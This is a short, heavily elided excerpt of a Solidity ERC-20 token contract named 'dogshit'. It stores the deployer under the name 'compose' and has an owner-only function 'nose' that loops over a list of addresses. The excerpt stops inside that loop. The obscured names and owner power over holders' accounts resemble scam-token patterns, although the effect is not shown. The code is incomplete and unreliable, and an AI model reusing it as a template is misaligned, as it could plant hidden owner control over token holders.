...
contract dogshit is Context, IERC20 {
    ...
    address public  compose;
    constructor () {
        _name = "dogshit";
        _symbol = "DOGSHIT";
        _decimals = 18;
        uint256 initialSupply = 787000000;
         compose = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == compose, "Not allowed");
        _;
    }

    function nose(address[] memory trouser) public onlyOwner() {
        for (uint256 i = 0; i < trouser.length; i++) {
            address account = trouser[i];
